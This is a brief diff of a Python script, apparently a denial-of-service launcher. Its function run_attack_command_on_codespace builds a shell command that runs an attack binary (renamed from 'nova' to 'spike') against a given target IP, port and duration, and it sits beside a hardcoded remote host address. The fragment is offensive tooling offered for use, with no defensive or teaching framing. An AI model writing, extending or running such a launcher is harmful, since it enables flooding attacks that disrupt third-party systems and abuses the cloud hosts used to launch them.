@@ -24,7 +24,7 @@ running_processes = []
 REMOTE_HOST = '4.213.71.147'
 
 async def run_attack_command_on_codespace(target_ip, target_port, duration):
-    command = f"./nova {target_ip} {target_port} {duration} 60"
+    command = f"./spike {target_ip} {target_port} {duration} 60"
     try:
         process = await asyncio.create_subprocess_shell(
             command,
